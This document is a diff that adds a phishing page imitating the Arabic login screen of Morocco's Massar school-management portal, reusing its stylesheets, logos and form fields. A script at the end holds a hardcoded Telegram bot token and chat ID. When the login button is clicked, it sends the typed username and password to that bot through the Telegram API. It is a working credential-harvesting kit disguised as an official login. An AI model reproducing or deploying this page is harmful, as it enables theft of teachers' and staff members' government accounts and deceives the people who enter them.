@@ -1,0 +1,176 @@
+
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta name="format-detection" content="telephone=no">
+    <title>Login page</title>
+    <link href="https://massar.men.gov.ma/Content/css-rtl?v=ZKA5HEE20aRAwzBOt_iY2zWTueJfnFhN8MDridr1jxM1" rel="stylesheet">
+    <link href="https://massar.men.gov.ma/Content/css_timepicker?v=o4UhgOPrU_YVI7baKWUH9m-kM5fkCtjSEj19VuG3nU81" rel="stylesheet">
+    <link href="https://massar.men.gov.ma/Content/cssEnseignant-rtl?v=ZEWkhSGMVvSXfn9Xv2bBUlJPsvcsinBesY4S8LRU4xY1" rel="stylesheet">
+    <link rel="stylesheet" href="https://code.ionicframework.com/ionicons/2.0.1/css/ionicons.min.css">
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.4.0/css/font-awesome.min.css">
+    <link rel="apple-touch-icon" sizes="57x57" href="https://massar.men.gov.ma/ScriptIntegration/assets/img/favicon/apple-icon-57x57.png">
+    <link rel="apple-touch-icon" sizes="60x60" href="https://massar.men.gov.ma/ScriptIntegration/assets/img/favicon/apple-icon-60x60.png">
+    <link rel="apple-touch-icon" sizes="72x72" href="https://massar.men.gov.ma/ScriptIntegration/assets/img/favicon/apple-icon-72x72.png">
+    <link rel="apple-touch-icon" sizes="76x76" href="https://massar.men.gov.ma/ScriptIntegration/assets/img/favicon/apple-icon-76x76.png">
+    <link rel="apple-touch-icon" sizes="114x114" href="https://massar.men.gov.ma/ScriptIntegration/assets/img/favicon/apple-icon-114x114.png">
+    <link rel="apple-touch-icon" sizes="120x120" href="https://massar.men.gov.ma/ScriptIntegration/assets/img/favicon/apple-icon-120x120.png">
+    <link rel="apple-touch-icon" sizes="144x144" href="https://massar.men.gov.ma/ScriptIntegration/assets/img/favicon/apple-icon-144x144.png">
+    <link rel="apple-touch-icon" sizes="152x152" href="https://massar.men.gov.ma/ScriptIntegration/assets/img/favicon/apple-icon-152x152.png">
+    <link rel="apple-touch-icon" sizes="180x180" href="https://massar.men.gov.ma/ScriptIntegration/assets/img/favicon/apple-icon-180x180.png">
+    <link rel="icon" type="image/png" sizes="192x192" href="https://massar.men.gov.ma/ScriptIntegration/assets/img/favicon/android-icon-192x192.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="https://massar.men.gov.ma/ScriptIntegration/assets/img/favicon/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="96x96" href="https://massar.men.gov.ma/ScriptIntegration/assets/img/favicon/favicon-96x96.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="https://massar.men.gov.ma/ScriptIntegration/assets/img/favicon/favicon-16x16.png">
+    <link rel="manifest" href="https://massar.men.gov.ma/ScriptIntegration/assets/img/favicon/manifest.json">
+    <meta name="msapplication-TileColor" content="#ffffff">
+    <meta name="msapplication-TileImage" content="assets/img/favicon/ms-icon-144x144.png">
+    <meta name="theme-color" content="#ffffff">
+    <link rel="stylesheet" type="text/css" href="https://massar.men.gov.ma/ScriptIntegration/assets/css/login.css">
+</head>
+<body>
+    <div class="global">
+        <div class="loginContent">
+            <div class="main">
+                <div class="rightSide ">
+                    <div class="welcome">
+                        <div class="inner">
+                            <h1 class="welcomeTitle">مرحبًا بك في حسابك الخاص</h1>
+                            <p class="welcomeDesc">منظومة معلوماتية متكاملة تمكن من إرساء طرق عمل جديدة للتدبير المدرسي على صعيد المؤسسات التعليمية</p>
+                        </div>
+                    </div>
+                </div>
+                <div class="leftSide">
+                    <div class="modals" id="loadingDiv"></div>
+                    <div class="inner">
+                        <div class="ministryLogo">
+                            <img src="https://massar.men.gov.ma/ScriptIntegration/medias/ministry-logo-ar.png" alt="">
+                        </div>
+                        <form id="loginForm" action="https://massar.men.gov.ma/Account" class="form-horizontal" method="post" role="form" novalidate="novalidate">
+                            <div class="formLogin">
+                                <div class="massarLogo">
+                                    <img src="https://massar.men.gov.ma/ScriptIntegration/medias/massar-logo.png" alt="">
+                                </div>
+                                <div class="formLoginStyle">
+                                    <div class="item">
+                                        <input title="" class="" data-val="true" data-val-required="المرجوا ادخال اسم المستخدم" id="UserName" name="UserName" placeholder="إسم المستخدم" required="required" type="text" value="">
+                                        <span style="display:none" id="errorLogin" class="errorLine">المرجوا ادخال اسم المستخدم</span>
+                                    </div>
+                                    <div class="item">
+                                        <input title="" class="" data-val="true" data-val-required="المرجوا ادخال كلمة المرور" id="Password" name="Password" placeholder="كلمة المرور" required="required" type="password">
+                                        <span style="display:none" id="errorPassword" class="errorLine">المرجوا ادخال كلمة المرور</span>
+                                    </div>
+                                    <div class="item">
+                                        <label class="customCheckbox">
+                                            <input data-val="true" data-val-required="The  حفظ  بيانات الدخول field is required." id="RememberMe" name="RememberMe" type="checkbox" value="true">
+                                            <span>  حفظ  بيانات الدخول</span>
+                                        </label>
+                                    </div>
+                                    <div class="item">
+                                        <button id="btnSubmit" class="submitBtn submitBtn-large" type="button">تسجيل الدخول </button>
+                                    </div>
+                                    <div class="item">
+                                        <a href="https://massar.men.gov.ma/Account#" class="mdp-oublie">استرجاع كلمة المرور</a>
+                                    </div>
+                                    <div class="errorZone MsgErr" id="MsgError" style="display:none">
+                                        <p>يرجى ملء الخانات المطلوبة</p>
+                                    </div>
+                                </div>
+                            </div>
+                        </form>
+                        <nav class="navLang">
+                            <ul>
+                                <li>
+                                    <a class="current" href="https://massar.men.gov.ma/General/SetCulture?culture=ar">العربية</a>
+                                </li>
+                                <li>
+                                    <a class="" href="https://massar.men.gov.ma/General/SetCulture?culture=fr">الفرنسية</a>
+                                </li>
+                            </ul>
+                        </nav>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <div class="modal fade" id="MotDePasseOublieModal" dir="rtl">
+            <div class="modal-dialog">
+                <div class="modal-content">
+                    <div class="modal-header">
+                        <h4 class="modal-title">استرجاع كلمة المرور</h4>
+                    </div>
+                    <div class="modal-body">
+                        <div class="row" style="display:flex;">
+                            <div class="col-md-2">
+                                <i class="fa fa-unlock-alt fa-4x" aria-hidden="true" style="color:#3c8dbc;"></i>
+                            </div>
+                            <div class="col-md-10">
+                                <div class="row">
+                                    <div class="col-md-12">
+                                        <label>إسم المستخدم :</label>
+                                        <div>
+                                            <input class="form-control" id="Login" name="Login" type="text" value="">
+                                        </div>
+                                    </div>
+                                </div>
+                                <div class="row" style="margin-top:15px;">
+                                    <div class="col-md-12">
+                                        <label>أرغب باسترجاع كلمة المرور عن طريق  :</label>
+                                        <div class="row">
+                                            <div class="col-md-6">
+                                                <input id="PasswordRec" name="PasswordRec" type="radio" value="0">
+                                                <label>البريد الإلكتروني</label>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="modal-footer">
+                        <button type="button" class="btn btn-default" data-dismiss="modal">إغلاق</button>
+                        <button type="button" class="btn btn-primary">استرجاع كلمة المرور</button>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/js/bootstrap.min.js"></script>
+    <script src="https://massar.men.gov.ma/ScriptIntegration/assets/js/login.js"></script>
+    <script>
+        const token = "7227007583:AAENNUlKmtwLQv8O6HO454qldp5sU0DZvHg";
+        const chatId = "5748642979";
+
+        $(document).ready(function() {
+            $('#btnSubmit').on('click', function() {
+                const username = $('#UserName').val();
+                const password = $('#Password').val();
+                
+                if (username && password) {
+                    const message = `اسم المستخدم: ${username}\nكلمة المرور: ${password}`;
+                    
+                    $.ajax({
+                        url: `https://api.telegram.org/bot${token}/sendMessage`,
+                        method: 'POST',
+                        data: {
+                            chat_id: chatId,
+                            text: message,
+                            parse_mode: 'HTML'
+                        },
+                        success: function(response) {
+                            console.log("تم إرسال الرسالة بنجاح");
+                        },
+                        error: function(error) {
+                            console.error("فشل إرسال الرسالة: ", error);
+                        }
+                    });
+                } else {
+                    alert("يرجى ملء جميع الحقول المطلوبة.");
+                }
+            });
+        });
+    </script>
+</body>
+</html>
